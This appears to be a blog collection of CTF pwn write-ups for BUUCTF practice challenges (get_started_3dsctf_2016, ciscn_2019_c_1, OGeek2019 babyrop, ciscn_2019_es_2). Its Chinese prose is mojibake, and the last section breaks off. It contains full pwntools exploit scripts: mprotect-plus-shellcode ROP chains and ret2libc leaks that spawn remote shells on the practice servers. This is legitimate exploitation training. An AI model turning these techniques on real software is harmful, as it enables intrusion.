<p>int mprotect(void *addr, size_t len, int prot);addrï¼šä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œaddrå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œç®€è€Œè¨€ä¹‹ä¸ºé¡µå¤§å°ï¼ˆä¸€èˆ¬æ˜¯ 4KB &#x3D;&#x3D; 4096å­—èŠ‚ï¼‰æ•´æ•°å€ã€‚</p>
<p>lenï¼šè¢«ä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„é•¿åº¦,æœ€å¥½ä¸ºé¡µå¤§å°æ•´æ•°å€ã€‚ä¿®æ”¹åŒºåŸŸèŒƒå›´[addr, addr+len-1]ã€‚<br>protï¼šå¯ä»¥å–ä»¥ä¸‹å‡ ä¸ªå€¼ï¼Œå¹¶å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§ç»“åˆèµ·æ¥ä½¿ç”¨ï¼š<br>1ï¼‰PROT_READï¼šå†…å­˜æ®µå¯è¯»ï¼›<br>2ï¼‰PROT_WRITEï¼šå†…å­˜æ®µå¯å†™ï¼›<br>3ï¼‰PROT_EXECï¼šå†…å­˜æ®µå¯æ‰§è¡Œï¼›<br>4ï¼‰PROT_NONEï¼šå†…å­˜æ®µä¸å¯è®¿é—®ã€‚<br>è¿”å›å€¼ï¼š0ï¼›æˆåŠŸï¼Œ-1ï¼›å¤±è´¥ï¼ˆå¹¶ä¸”errnoè¢«è®¾ç½®ï¼‰<br>1ï¼‰EACCESï¼šæ— æ³•è®¾ç½®å†…å­˜æ®µçš„ä¿æŠ¤å±æ€§ã€‚å½“é€šè¿‡ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»æƒé™æ—¶ï¼Œæ¥ç€ä½¿ç”¨ mprotect() æ ‡å¿—ä¸º PROT_WRITEè¿™ç§æƒ…å†µå°±ä¼šå‘ç”Ÿã€‚<br>2ï¼‰EINVALï¼šaddrä¸æ˜¯æœ‰æ•ˆæŒ‡é’ˆï¼Œæˆ–è€…ä¸æ˜¯ç³»ç»Ÿé¡µå¤§å°çš„å€æ•°ã€‚<br>3ï¼‰ENOMEMï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚<br>è¿™é‡Œçš„å‚æ•°protï¼š<br>            r:4<br>            w:2<br>            x:1</p>
</blockquote>
<p>æˆ‘ä»¬é€šè¿‡vmmapå¯ä»¥çœ‹åˆ°0x080ea000åˆ°0x080ec000æ˜¯å¯è¯»å¯å†™ä½†æ˜¯ä¸å¯æ‰§è¡Œçš„ï¼ˆå¼€äº†NXä¿æŠ¤ï¼‰ï¼Œæ‰€ä»¥ç”¨mprotect()å°†è¿™ä¸€æ®µä¿®æ”¹æˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡read()ä¼ shellcodeåˆ°æ­¤å¤„</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯mprotectæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ï¼Œå¹¶ä¸”åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ï¼ˆ0x1000&#x3D;4096ï¼‰</p>
<p>æˆ‘ä»¬çŸ¥é“32ä½è°ƒç”¨å‡½æ•°ä¸éœ€è¦å¯„å­˜å™¨ä¼ å‚ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦ç”¨popï¼Œretæ¥æ§åˆ¶ç¨‹åºè¿è¡Œæµç¨‹ï¼Œ ç”¨ ROPgadget éšä¾¿é€‰ä¸€ä¸ªæœ‰ä¸‰ä¸ªå¯„å­˜å™¨åŠ ä¸€ä¸ªretçš„gadget </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27364</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span> , endian = <span class="string">&#x27;little&#x27;</span>) <span class="comment">#å°ç«¯åºï¼Œlinuxç³»ç»Ÿï¼Œ32ä½æ¶æ„,debug</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf_addr = <span class="number">0x80eb000</span>   <span class="comment">#è¦ä¿®æ”¹çš„å†…å­˜é¡µé¦–åœ°å€</span></span><br><span class="line">buf_size = <span class="number">0x1000</span>      <span class="comment">#è¦ä¿®æ”¹çš„å†…å­˜é¡µå¤§å°</span></span><br><span class="line">buf_prot = <span class="number">0x7</span>         <span class="comment">#è¦ä¿®æ”¹çš„æƒé™</span></span><br><span class="line"></span><br><span class="line">pop_3_ret = <span class="number">0x08063adb</span>  <span class="comment">#å¯„å­˜å™¨ä¼ å‚å¤–åŠ retè¿”å›readå‡½æ•°åœ°å€ </span></span><br><span class="line"><span class="comment">#0x08063adb : pop edi ; pop esi ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect)  <span class="comment">#å…ˆå°†è¿”å›åœ°å€è¦†ç›–ä¸ºmprotectå‡½æ•°åœ°å€</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_3_ret)  <span class="comment">#é€šè¿‡ä¸‰ä¸ªå¯„å­˜å™¨ä¼ å‚å†åŠ ä¸Šretè¿”å›æ ˆä¸Šä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#è¦ä¿®æ”¹çš„å†…å­˜é¡µé¦–åœ°å€</span></span><br><span class="line">payload += p32(buf_size)    <span class="comment">#è¦ä¿®æ”¹çš„å†…å­˜é¡µå¤§å°</span></span><br><span class="line">payload += p32(buf_prot)    <span class="comment">#è¦ä¿®æ”¹çš„æƒé™</span></span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)  <span class="comment">#retè¿”å›æ ˆä¸Šä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ä¸ºreadå‡½æ•°åœ°å€</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#readå‡½æ•°çš„è¿”å›åœ°å€</span></span><br><span class="line">payload += p32(<span class="number">0</span>)           <span class="comment">#readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#readå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>)    <span class="comment">#readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">sh.sendline(payload)    </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)   </span><br><span class="line">sh.sendline(shellcode)      <span class="comment">#readå‡½æ•°è¾“å…¥buf_addrçš„å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>å‚è€ƒæ–‡ç« </p>
<p><a href="https://blog.csdn.net/tbsqigongzi/article/details/124457938?spm=1001.2014.3001.5501">1</a>    <a href="https://blog.csdn.net/qq_15762939/article/details/104062307">2</a>  <a href="https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/">3</a>  <a href="http://liul14n.top/2020/02/25/get-started-3dsctf-2016/">4</a>  <a href="https://www.shawroot.cc/2010.html">5</a>  <a href="https://blog.csdn.net/A951860555/article/details/111030289">6</a></p>
<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>ç®€å•çš„ret2libc3<br>file checksec â€”â€” 64-bit å¼€NX</p>
<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>è¿è¡Œä¸€ä¸‹çœ‹çœ‹</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p>
<p>å†çœ‹çœ‹IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<p>ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„<br>å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinsh<br>åˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>åˆ†æå¤§è‡´æµç¨‹å°±æ˜¯</p>
<ol>
<li>åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬</li>
<li>ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡</li>
<li>å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™&#x2F;bin&#x2F;shâ€˜ï¼‰</li>
</ol>
<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>å†™exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28342</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>çš„githubç½‘å€<br>å®‰è£…</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>è¦†ç›–æ•°æ®payload&#x3D;bâ€™\0â€™+bâ€™aâ€™*(0x50-1+8)<br>\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œ<br>bufçš„å¤§å°ä¸º0x50<br>-1æ˜¯å‡å»\0<br>+8æ˜¯è¦†ç›–rbp</p>
<p>è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶<br>æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼Œ<br>åŸå› </p>
<blockquote>
<p>recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\n;<br>ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›<br>ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0a<br>ç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚<br>å…ˆå¼€ä¸€ä¸‹context_log_lever&#x3D;â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚</p>
</blockquote>
<p>ç„¶åå†ç”¨recvuntil(â€˜\nâ€™)[:-1].ljust(8,â€™\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\x0â€™å¹¶å‘å·¦è¡¥é½</p>
<p>è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†<br>32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ<br>64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åºã€‚å› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p>
<p>æ³¨æ„æ ˆå¯¹é½<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"></p>
<p>è¿˜æœ‰æœ€åè¿˜è¦å†è¾“ä¸€ä¸ª0</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p>
<p>å‚è€ƒèµ„æ–™ï¼š<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6â€”â€”ciscn_2019_c_1</a></p>
<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64ä½ç¨‹åºï¼Œå¼€å¯NX</p>
<p>æ²¡æœ‰systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>åˆ†æç¨‹åºï¼š mainå‡½æ•°ä¸­ï¼Œå…ˆè¯»å–ä¸€ä¸ªéšæœºæ•°åˆ°fdï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ å…¥sub_804871Få‡½æ•°ï¼Œå†å°†sub_804871Få‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå‚æ•°ä¼ å…¥sub_80487D0å‡½æ•°é‡Œã€‚</p>
<p>mainå‡½æ•°</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213530841-697585877.png" alt="image-20230807205450139"></p>
<p>sub_804871Få‡½æ•°</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531189-116431913.png" alt="image-20230807205837589"></p>
<p>sub_80487D0å‡½æ•°</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531499-314115011.png" alt="image-20230807205912958"></p>
<p>è§‚å¯Ÿç¨‹åºæˆ‘ä»¬å¯ä»¥å‘ç°sub_80487D0å‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´</p>
<p>ç„¶è€Œæƒ³è¦åˆ©ç”¨æ ˆæº¢å‡ºéœ€è¦æˆ‘ä»¬è¾¾æˆä¸¤ä¸ªç›®æ ‡</p>
<p>1ã€ç»•è¿‡sub_804871Få‡½æ•°ä¸­çš„exitå‡½æ•°ï¼Œè¿™å°±è¦è®©strncmpçš„è¿”å›å€¼ä¸º0</p>
<p>2ã€è®©sub_80487D0å‡½æ•°ä¸­a1ï¼ˆå³buf[7]ï¼‰çš„ASCIIç å€¼å°½å¯èƒ½å¤§ï¼Œæ„é€ æ ˆæº¢å‡º</p>
<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œbufå’Œsæ•°ç»„å®Œå…¨ç›¸ç­‰æ—¶ï¼Œstrncmpå‡½æ•°è¿”å›0ï¼Œä½†æ˜¯sprinfå‡½æ•°å°†éšæœºæ•°åŠ åˆ°äº†sæ•°ç»„ä¸­ï¼Œbufä¸så¾ˆéš¾ç›¸ç­‰ã€‚ä¸è¿‡åœ¨v1ä¸º0çš„æ—¶å€™strncmpå‡½æ•°ä¹Ÿæ˜¯ä¼šè¿”å›0çš„ï¼Œè€Œv1æ˜¯è¯»å–çš„bufçš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶bufçš„ç¬¬ä¸€ä½ä¸ºâ€™\x00â€™ï¼Œå¯èµ·åˆ°æˆªæ–­å­—ç¬¦ä¸²é•¿åº¦çš„æ•ˆæœã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼Œè‹¥è¦åˆ©ç”¨æ ˆæº¢å‡ºret2libcæ³„éœ²writeå‡½æ•°åœ°å€çš„è¯ï¼Œèµ·ç éœ€è¦231+4+4*5 &#x3D; 255ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è®©buf[7] &#x3D; â€˜\xffâ€™å³å¯ã€‚ä»£ç ä¸­çš„buf[v5-1] &#x3D; 0æ”¹å˜çš„æ˜¯å­—ç¬¦ä¸²æœ«å°¾â€™\x00â€™çš„å€¼ï¼Œä¸å½±å“buf[7] ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ¬¡è¯»å–çš„payloadä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>æ³¨æ„æœ¬é¢˜æä¾›äº†libcï¼Œç›´æ¥ä½¿ç”¨pwntoolså·¥å…·å³å¯ï¼Œä¸å¿…ä½¿ç”¨LibcSearcher</p>
<p>mainå‡½æ•°åœ°å€ç”¨elf.sym[â€˜mainâ€™]æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œobjdump -tå‘½ä»¤æŸ¥çœ‹å‘ç°ç¨‹åºæ²¡æœ‰ç¬¦å·è¡¨ï¼ŒåŸå› åº”è¯¥æ˜¯å‡ºé¢˜äººä½¿ç”¨stripå‘½ä»¤å»ç¬¦å·è¡¨äº†</p>
<p>å®Œæ•´exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">libc_base = write_addr -  libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32ä½å¼€NXï¼Œæœ‰systemå‡½æ•°ï¼Œä½†æ˜¯éœ€è¦ä¼ å…¥binshã€‚</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081134102.png" alt="image-20230808113405078"></p>
<p>ç„¶è€Œï¼Œæ ˆä¸Šå˜é‡ <strong>s</strong> ä½äº <strong>ebp</strong>-0x28ï¼Œè€Œ <strong>read</strong> å‡½æ•°ä»…èƒ½è¯»å…¥0x30ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆè‹¥æƒ³å®æ–½ç¼“å†²åŒºæº¢å‡ºï¼Œåªæœ‰0x08 &#x3D; 0x30-0x28ä¸ªå­—èŠ‚ä¾›æˆ‘ä»¬è¿›è¡Œå¸ƒå±€ã€‚å› æ­¤ï¼Œåœ¨åªæœ‰ <strong>ebp</strong> ä¸ <strong>ret</strong> èƒ½è¢«ç¯¡æ”¹çš„æ¡ä»¶ä¸‹å¯å°è¯•ä½¿ç”¨æ ˆè¿ç§»ã€‚</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081105982.png" alt="image-20230808110517945"></p>
<p>ç¨‹åºå­˜åœ¨leave retæŒ‡ä»¤ï¼Œå¹¶ä¸”å­˜åœ¨systemå‡½æ•°å¯æ‰§è¡Œ</p>
<p>è€Œbinshåˆ™éœ€è¦åœ¨æ ˆä¸Šä¼ å…¥</p>
<p>Soï¼Œæˆ‘ä»¬æœ€ç»ˆè¦å°† <strong>esp</strong>ï¼ˆä¸ <strong>ebp</strong>ï¼‰åŠ«æŒåˆ°å½“å‰æ ˆçš„å¦ä¸€åŒºåŸŸä¸Šï¼Œä»¥å®Œæˆä¼ ç»Ÿæ ˆæº¢å‡ºpayloadçš„å®æ–½</p>
<p>åœ¨æœ¬é¢˜ä¸­ï¼ŒåŠ«æŒç›®æ ‡åœ°å€å³ä¸ºç¼“å†²åŒºå˜é‡ <strong>s</strong> çš„èµ·å§‹åœ°å€</p>
<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><h3 id="ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp-åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€"><a href="#ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp-åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp+åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€"></a>ç¬¬ä¸€æ­¥ï¼Œæ³„éœ²å‡ºebpï¼Œé€šè¿‡ebp+åç§»é‡çš„æ–¹æ³•è®¡ç®—æ ˆä¸Šåœ°å€</h3><p>printfå‡½æ•°åœ¨æœªé‡åˆ°â€\x00â€æ—¶ä¼šä¸€ç›´è¾“å‡ºï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²å‡ºebpçš„å€¼</p>
<p>å› ä¸ºæ ˆä¸Šåœ°å€é—´çš„ç›¸å¯¹ä½ç½®æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥çš„ä½ç½®å’Œæ³„éœ²çš„ebpåœ°å€çš„åç§»æ¥å®šä½æˆ‘ä»¬çš„ç›®æ ‡åœ°å€</p>
